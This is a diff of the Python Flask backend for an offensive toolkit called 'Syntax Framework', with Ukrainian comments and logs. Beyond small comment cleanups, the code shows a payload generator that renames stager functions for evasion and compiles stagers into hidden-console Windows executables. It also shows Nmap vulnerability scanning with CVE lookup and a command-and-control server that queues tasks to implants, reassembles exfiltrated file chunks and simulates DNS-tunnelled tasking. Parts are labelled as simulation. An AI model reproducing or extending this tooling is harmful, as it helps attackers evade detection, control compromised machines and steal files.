             stager_code_raw_for_metamorph = re.sub(rf"\b{decode_func_name_runtime}\b", final_decode_name, stager_code_raw_for_metamorph)
             stager_code_raw_for_metamorph = re.sub(rf"\b{evasion_func_name_runtime}\b", final_evasion_name, stager_code_raw_for_metamorph)
             stager_code_raw_for_metamorph = re.sub(rf"\b{execute_func_name_runtime}\b", final_execute_name, stager_code_raw_for_metamorph)
-            if final_unveil_name: # Якщо функція unveil_ була знайдена
+            if final_unveil_name: 
                 new_unveil_for_obf_strings = generate_random_var_name(prefix="reveal_")
                 stager_code_raw_for_metamorph = re.sub(rf"\b{final_unveil_name}\b", new_unveil_for_obf_strings, stager_code_raw_for_metamorph)
                 log_messages.append(f"[BACKEND_METAMORPH_SUCCESS] Метаморфізм застосовано (ключові функції: {new_unveil_for_obf_strings}, {final_decode_name}, {final_evasion_name}, {final_execute_name}).")
@@ -1622,13 +1710,12 @@ def handle_generate_payload():
                 log_messages.append(f"[BACKEND_METAMORPH_SUCCESS] Метаморфізм застосовано (ключові функції: {final_decode_name}, {final_evasion_name}, {final_execute_name}). Функцію обфускації рядків не знайдено для перейменування.")
             stager_code_raw = stager_code_raw_for_metamorph
 
-
         output_format = validated_params.get("output_format")
         final_stager_output = ""
 
         if output_format == "pyinstaller_exe_windows":
             log_messages.append("[BACKEND_PYINSTALLER_INFO] Обрано формат PyInstaller EXE.")
-            pyinstaller_path = shutil.which("pyinstaller") # Шукаємо pyinstaller в PATH
+            pyinstaller_path = shutil.which("pyinstaller") 
             if not pyinstaller_path:
                 log_messages.append("[BACKEND_PYINSTALLER_ERROR] PyInstaller не знайдено в системному PATH. Повернення Base64 Python-коду.")
                 final_stager_output = base64.b64encode(stager_code_raw.encode('utf-8')).decode('utf-8')
@@ -1636,7 +1723,7 @@ def handle_generate_payload():
             else:
                 log_messages.append(f"[BACKEND_PYINSTALLER_INFO] PyInstaller знайдено: {pyinstaller_path}")
                 pyinstaller_options_str = validated_params.get("pyinstaller_options", "--onefile --noconsole")
-                pyinstaller_options = shlex.split(pyinstaller_options_str) # Розбиваємо рядок опцій на список
+                pyinstaller_options = shlex.split(pyinstaller_options_str) 
                 with tempfile.TemporaryDirectory() as tmpdir:
                     log_messages.append(f"[BACKEND_PYINSTALLER_INFO] Створено тимчасову директорію: {tmpdir}")
                     temp_py_filename = os.path.join(tmpdir, "stager_to_compile.py")
@@ -1650,15 +1737,15 @@ def handle_generate_payload():
 
                     pyinstaller_cmd = [
                         pyinstaller_path,
-                        *pyinstaller_options, # Розпаковуємо опції
+                        *pyinstaller_options, 
                         "--distpath", dist_path,
                         "--workpath", work_path,
-                        "--specpath", tmpdir, # Зберігаємо .spec файл у тимчасовій директорії
+                        "--specpath", tmpdir, 
                         temp_py_filename
                     ]
                     log_messages.append(f"[BACKEND_PYINSTALLER_INFO] Запуск PyInstaller: {' '.join(pyinstaller_cmd)}")
                     try:
-                        compile_process = subprocess.run(pyinstaller_cmd, capture_output=True, text=True, check=False, timeout=300) # Таймаут 5 хвилин
+                        compile_process = subprocess.run(pyinstaller_cmd, capture_output=True, text=True, check=False, timeout=300) 
                         log_messages.append(f"[BACKEND_PYINSTALLER_STDOUT] {compile_process.stdout}")
                         if compile_process.returncode != 0:
                             log_messages.append(f"[BACKEND_PYINSTALLER_ERROR] Помилка PyInstaller (код: {compile_process.returncode}): {compile_process.stderr}")
@@ -1689,12 +1776,12 @@ def handle_generate_payload():
         elif output_format == "base64_encoded_stager":
             final_stager_output = base64.b64encode(stager_code_raw.encode('utf-8')).decode('utf-8')
             log_messages.append("[BACKEND_FORMAT_INFO] Стейджер Base64.")
-        else: # raw_python_stager
+        else: 
             final_stager_output = stager_code_raw
             log_messages.append("[BACKEND_FORMAT_INFO] Raw Python Стейджер.")
 
         log_messages.append("[BACKEND_SUCCESS] Пейлоад згенеровано.")
-        time.sleep(0.2) # Невелика затримка для імітації завершення
+        time.sleep(0.2) 
         return jsonify({"success": True, "stagerCode": final_stager_output, "generationLog": "\n".join(log_messages)}), 200
     except Exception as e:
         print(f"SERVER ERROR (generate_payload): {str(e)}"); import traceback; traceback.print_exc()
@@ -1710,7 +1797,7 @@ def handle_run_recon():
 
         target = data.get("target")
         recon_type = data.get("recon_type")
-        nmap_options_str = data.get("nmap_options_str", "") # Отримуємо рядок опцій Nmap
+        nmap_options_str = data.get("nmap_options_str", "") 
         log_messages.append(f"[BACKEND_INFO] Розвідка: Ціль='{target}', Тип='{recon_type}', Опції Nmap='{nmap_options_str}'.")
 
         if not target or not recon_type: return jsonify({"success": False, "error": "Missing params (target or recon_type)", "reconLog": "\n".join(log_messages+["[BE_ERR] Missing params."])}), 400
@@ -1762,7 +1849,7 @@ def handle_run_recon():
                                 if script_info['tables']:
                                     for table_idx, table_item in enumerate(script_info['tables']):
                                         report_lines.append(f"      Table {table_idx+1}:")
-                                        for k_t, v_t in table_item.items(): # Змінено k,v на k_t,v_t
+                                        for k_t, v_t in table_item.items(): 
                                             report_lines.append(f"        {k_t}: {v_t}")
                         report_lines.append("") 
                 else:
@@ -1772,7 +1859,7 @@ def handle_run_recon():
                 report_lines.append("--- Open Ports, Services, Scripts & CVEs ---")
                 if parsed_services_nmap:
                     cve_log_additions_local = []
-                    cve_results_local = conceptual_cve_lookup_be(parsed_services_nmap, cve_log_additions_local) # Використовує нову функцію з API симуляцією
+                    cve_results_local = conceptual_cve_lookup_be(parsed_services_nmap, cve_log_additions_local) 
                     recon_log_additions.extend(cve_log_additions_local)
                     
                     for service in parsed_services_nmap:
@@ -1785,10 +1872,15 @@ def handle_run_recon():
                         
                         service_cves_found = [cve for cve in cve_results_local if str(cve.get('port')) == str(service.get('port')) and cve.get('host_ip', service.get('host_ip')) == service.get('host_ip')]
                         if service_cves_found:
-                            report_lines.append(f"  CVEs (Source: {service_cves_found[0].get('source', 'N/A')}):") # Показуємо джерело першого CVE
+                            report_lines.append(f"  CVEs (Source: {service_cves_found[0].get('source', 'N/A')}):") 
                             for cve in service_cves_found:
                                 report_lines.append(f"    - {cve['cve_id']} (Severity: {cve['severity']})")
                                 report_lines.append(f"      Summary: {cve['summary']}")
+                                # Додаткове відображення нових полів CVE
+                                if cve.get('cvss_score') is not None: report_lines.append(f"      CVSS Score: {cve['cvss_score']} (v{cve.get('cvss_version', '')})")
+                                if cve.get('cvss_vector'): report_lines.append(f"      CVSS Vector: {cve['cvss_vector']}")
+                                if cve.get('published_date'): report_lines.append(f"      Published: {cve['published_date']}")
+                                if cve.get('references'): report_lines.append(f"      References: {', '.join(cve['references'][:2])}{'...' if len(cve['references']) > 2 else ''}")
                         
                         if service.get("scripts"):
                             report_lines.append("  Port Scripts Output:")
@@ -1806,18 +1898,18 @@ def handle_run_recon():
                                          report_lines.append(f"      Raw Output: {script_info['output'].strip()}")
                                 if script_info['structured_data']:
                                     report_lines.append("      Structured Data:")
-                                    for k_sd, v_sd in script_info['structured_data'].items(): # Змінено k,v
+                                    for k_sd, v_sd in script_info['structured_data'].items(): 
                                         report_lines.append(f"        {k_sd}: {v_sd}")
                                 if script_info['tables']:
                                     for table_idx, table_item in enumerate(script_info['tables']):
                                         report_lines.append(f"      Table {table_idx+1}:")
-                                        for k_td, v_td in table_item.items(): # Змінено k,v
+                                        for k_td, v_td in table_item.items(): 
                                             report_lines.append(f"          {k_td}: {v_td}")
                         report_lines.append("")
                 else:
                     report_lines.append("Services for analysis not found or Nmap scan failed before service parsing.")
                 
-                if recon_type == "port_scan_nmap_vuln_scripts": # Додаємо сирий XML тільки для vuln_scripts
+                if recon_type == "port_scan_nmap_vuln_scripts": 
                      report_lines.append("\n--- Raw Nmap XML Output (for detailed analysis) ---")
                      report_lines.append(nmap_xml_data if nmap_xml_data.strip() else "Nmap did not produce XML output or it was empty.")
 
@@ -1854,33 +1946,31 @@ def handle_c2_beacon():
         if last_task_id_received: log_messages_c2_beacon.append(f"   Результат завдання '{last_task_id_received}' (Успіх: {task_success_received}): {str(last_task_result_received)[:200]}{'...' if len(str(last_task_result_received)) > 200 else ''}")
 
         file_exfil_chunk_data = beacon_data.get("file_exfil_chunk")
-        if file_exfil_chunk_data and last_task_id_received: # Переконуємося, що чанк прив'язаний до завдання
+        if file_exfil_chunk_data and last_task_id_received: 
             file_path = file_exfil_chunk_data.get("file_path")
             chunk_num = file_exfil_chunk_data.get("chunk_num")
             total_chunks = file_exfil_chunk_data.get("total_chunks")
             data_b64 = file_exfil_chunk_data.get("data_b64")
             is_final_chunk = file_exfil_chunk_data.get("is_final", False)
 
-            file_key = f"{implant_id_from_beacon}_{last_task_id_received}_{file_path}" # Унікальний ключ для файлу/завдання
+            file_key = f"{implant_id_from_beacon}_{last_task_id_received}_{file_path}" 
             if file_key not in exfiltrated_file_chunks_db:
                 exfiltrated_file_chunks_db[file_key] = {"file_path": file_path, "task_id": last_task_id_received, "total_chunks": total_chunks, "received_chunks": {}, "implant_id": implant_id_from_beacon, "first_seen": datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
             
-            if data_b64: # Якщо є дані в чанку
+            if data_b64: 
                  exfiltrated_file_chunks_db[file_key]["received_chunks"][chunk_num] = data_b64
                  log_messages_c2_beacon.append(f"   [EXFIL_CHUNK] Отримано чанк #{chunk_num}/{total_chunks} для '{file_path}' (ID завдання: {last_task_id_received}).")
 
             if is_final_chunk or (total_chunks is not None and len(exfiltrated_file_chunks_db[file_key]["received_chunks"]) == total_chunks):
                 log_messages_c2_beacon.append(f"   [EXFIL_COMPLETE] Всі {total_chunks} чанків для '{file_path}' (ID завдання: {last_task_id_received}) отримано від {implant_id_from_beacon}.")
-                # Тут можна було б зібрати файл, але для симуляції просто видаляємо запис
                 if file_key in exfiltrated_file_chunks_db: del exfiltrated_file_chunks_db[file_key] 
         elif beacon_data.get("file_exfil_error"): log_messages_c2_beacon.append(f"   [EXFIL_ERROR_REPORTED] Імплант повідомив про помилку ексфільтрації: {beacon_data['file_exfil_error']}")
-
 
         implant_found_in_list = False
         for implant in simulated_implants_be:
             if implant["id"] == implant_id_from_beacon:
                 implant["lastSeen"] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-                implant["status"] = "active_beaconing" # Оновлюємо статус
+                implant["status"] = "active_beaconing" 
                 implant_found_in_list = True
                 log_messages_c2_beacon.append(f"[C2_BEACON_UPDATE] Оновлено lastSeen та статус для імпланта {implant_id_from_beacon}.")
                 break
@@ -1888,12 +1978,12 @@ def handle_c2_beacon():
             log_messages_c2_beacon.append(f"[C2_BEACON_WARN] Маячок від невідомого ID імпланта: {implant_id_from_beacon}. Додавання до списку.")
             new_implant_data = {"id": implant_id_from_beacon, "ip": request.remote_addr, "os": beacon_data.get("os_type", "Unknown from beacon"), "lastSeen": datetime.now().strftime('%Y-%m-%d %H:%M:%S'), "status": "active_beaconing_new", "files": [], "beacon_interval_sec": beacon_data.get("beacon_interval_sec", 60)}
             simulated_implants_be.append(new_implant_data)
-            simulated_implants_be.sort(key=lambda x: x["id"]) # Підтримуємо сортування
+            simulated_implants_be.sort(key=lambda x: x["id"]) 
 
         next_task_to_assign = None
         if implant_id_from_beacon in pending_tasks_for_implants and pending_tasks_for_implants[implant_id_from_beacon]:
-            next_task_to_assign = pending_tasks_for_implants[implant_id_from_beacon].pop(0) # Беремо перше завдання з черги
-            if not pending_tasks_for_implants[implant_id_from_beacon]: # Якщо черга порожня, видаляємо ключ
+            next_task_to_assign = pending_tasks_for_implants[implant_id_from_beacon].pop(0) 
+            if not pending_tasks_for_implants[implant_id_from_beacon]: 
                 del pending_tasks_for_implants[implant_id_from_beacon]
             log_messages_c2_beacon.append(f"[C2_TASK_ISSUED] Видано завдання '{next_task_to_assign.get('task_id')}' ({next_task_to_assign.get('task_type')}) для імпланта {implant_id_from_beacon}.")
         
@@ -1912,26 +2002,25 @@ def handle_dns_resolver_sim():
     log_messages_dns_sim = [f"[C2_DNS_SIM v{VERSION_BACKEND}] Запит о {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}."]
     try:
         query_hostname = request.args.get('q')
-        implant_id_from_dns_req = request.args.get('id') # ID імпланта тепер передається окремо
+        implant_id_from_dns_req = request.args.get('id') 
         log_messages_dns_sim.append(f"[C2_DNS_SIM_RECEIVED] Отримано DNS-запит (симуляція): q='{query_hostname}', id='{implant_id_from_dns_req}'.")
 
         if not query_hostname or not implant_id_from_dns_req:
             return jsonify({"success": False, "error": "Missing query or implant ID in DNS sim request", "log": "\n".join(log_messages_dns_sim)}), 400
         
-        # Проста логіка: якщо є завдання для цього імпланта, кодуємо його в TXT-подібну відповідь
         next_task_dns = None
         if implant_id_from_dns_req in pending_tasks_for_implants and pending_tasks_for_implants[implant_id_from_dns_req]:
-            next_task_dns = pending_tasks_for_implants[implant_id_from_dns_req].pop(0) # Беремо перше завдання
+            next_task_dns = pending_tasks_for_implants[implant_id_from_dns_req].pop(0) 
             if not pending_tasks_for_implants[implant_id_from_dns_req]:
-                del pending_tasks_for_implants[implant_id_from_dns_req] # Видаляємо, якщо черга порожня
+                del pending_tasks_for_implants[implant_id_from_dns_req] 
             log_messages_dns_sim.append(f"[C2_DNS_SIM_TASK_FOUND] Знайдено завдання для {implant_id_from_dns_req}: {next_task_dns.get('task_id')}")
         
         response_payload = {"message": "DNS query processed by Syntax C2 Simulator."}
         if next_task_dns:
             task_json_str = json.dumps(next_task_dns)
             task_b64_str = base64.b64encode(task_json_str.encode('utf-8')).decode('utf-8')
-            response_payload["dns_txt_response_payload"] = task_b64_str # Імітація TXT запису з завданням
-            response_payload["task_data"] = next_task_dns # Для зручності налагодження, можна прибрати в продакшені
+            response_payload["dns_txt_response_payload"] = task_b64_str 
+            response_payload["task_data"] = next_task_dns 
             log_messages_dns_sim.append(f"[C2_DNS_SIM_RESPONSE_WITH_TASK] Відповідь з завданням (B64): {task_b64_str[:50]}...")
         else:
             log_messages_dns_sim.append("[C2_DNS_SIM_RESPONSE_NO_TASK] Відповідь без нового завдання.")
@@ -1942,20 +2031,18 @@ def handle_dns_resolver_sim():
         log_messages_dns_sim.append(f"[C2_DNS_SIM_FATAL_ERROR] {str(e)}")
         return jsonify({"success": False, "error": "Server error processing DNS sim request", "log": "\n".join(log_messages_dns_sim)}), 500
 
-
 @app.route('/api/c2/implants', methods=['GET'])
 def get_c2_implants():
     global simulated_implants_be
     log_messages_c2_get_implants = [f"[C2_GET_IMPLANTS v{VERSION_BACKEND}] Запит о {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}."]
     try:
-        # Оновлення статусу імплантів, якщо вони давно не виходили на зв'язок
         current_time = time.time()
         for implant in simulated_implants_be:
             try:
                 last_seen_dt = datetime.strptime(implant["lastSeen"], '%Y-%m-%d %H:%M:%S')
-                if current_time - last_seen_dt.timestamp() > (implant.get("beacon_interval_sec", 60) * 5): # 5 інтервалів маячка
+                if current_time - last_seen_dt.timestamp() > (implant.get("beacon_interval_sec", 60) * 5): 
                     implant["status"] = "offline_timeout"
-            except ValueError: # Якщо дата в неправильному форматі
+            except ValueError: 
                  implant["status"] = "offline_unknown_lastseen"
 
         log_messages_c2_get_implants.append(f"[C2_GET_IMPLANTS_INFO] Повернення {len(simulated_implants_be)} імітованих імплантів.")
@@ -1977,8 +2064,8 @@ def handle_c2_task():
 
         implant_id = task_data.get("implant_id")
         task_type = task_data.get("task_type")
-        task_params = task_data.get("task_params", "") # Може бути рядком або словником для upload_file_b64
-        queue_task_flag = task_data.get("queue_task", True) # За замовчуванням ставимо в чергу
+        task_params = task_data.get("task_params", "") 
+        queue_task_flag = task_data.get("queue_task", True) 
 
         log_messages_c2_task.append(f"[C2_TASK_RECEIVED] Отримано завдання для ID: {implant_id}, Тип: {task_type}, Параметри: {str(task_params)[:100]}..., Черга: {queue_task_flag}")
 
@@ -1986,18 +2073,14 @@ def handle_c2_task():
             log_messages_c2_task.append("[C2_TASK_ERROR] Відсутній ID імпланта або тип завдання.")
             return jsonify({"success": False, "error": "Missing implant_id or task_type", "log": "\n".join(log_messages_c2_task)}), 400
 
-        # Перевірка, чи існує такий імплант (хоча б у симуляції)
         if not any(imp['id'] == implant_id for imp in simulated_implants_be):
             log_messages_c2_task.append(f"[C2_TASK_WARN] Спроба поставити завдання для невідомого імпланта ID: {implant_id}.")
-            # Можна повернути помилку, або все одно додати до черги, якщо очікується, що імплант з'явиться
-            # return jsonify({"success": False, "error": f"Implant ID {implant_id} not found.", "log": "\n".join(log_messages_c2_task)}), 404
-
 
         new_task_id = f"TASK-{uuid.uuid4().hex[:8].upper()}"
         task_to_queue = {
             "task_id": new_task_id,
             "task_type": task_type,
-            "task_params": task_params, # Зберігаємо як є (рядок або словник)
+            "task_params": task_params, 
             "timestamp_created": datetime.now().strftime('%Y-%m-%d %H:%M:%S')
         }
 
@@ -2007,7 +2090,6 @@ def handle_c2_task():
         pending_tasks_for_implants[implant_id].append(task_to_queue)
         log_messages_c2_task.append(f"[C2_TASK_QUEUED] Завдання {new_task_id} ({task_type}) додано до черги для імпланта {implant_id}.")
         
-        # Оновлення статусу імпланта, якщо він є
         for implant_entry in simulated_implants_be:
             if implant_entry["id"] == implant_id:
                 implant_entry["status"] = "task_pending"
@@ -2032,7 +2114,6 @@ def get_operational_data():
         sim_logs = generate_simulated_operational_logs_be()
         sim_stats = get_simulated_stats_be()
         
-        # Додамо лог про отримані файли/чанки, якщо є
         if exfiltrated_file_chunks_db:
             for file_key, file_info in list(exfiltrated_file_chunks_db.items()): 
                 num_received = len(file_info.get("received_chunks", {}))
@@ -2091,7 +2172,6 @@ def update_framework_rules():
         log_messages_rules.append(f"[RULES_FATAL_ERROR] {str(e)}")
         return jsonify({"success": False, "error": "Server error updating framework rules", "log": "\n".join(log_messages_rules)}), 500
 
-
 if __name__ == '__main__':
     print("="*60)
     print(f"Syntax Framework - Концептуальний Backend v{VERSION_BACKEND}")
@@ -2107,6 +2187,7 @@ if __name__ == '__main__':
     print("  POST /api/framework_rules")
     print("Переконайтеся, що 'nmap' встановлено та доступно в PATH для використання Nmap-сканувань.")
     print("Для генерації .EXE пейлоадів, PyInstaller має бути встановлений та доступний в PATH.")
+    print("Також, для використання NVD API, може знадобитися ключ API, встановлений як змінна середовища NVD_API_KEY.")
     print("Натисніть Ctrl+C для зупинки.")
     print("="*60)
     app.run(host='localhost', port=5000, debug=False)
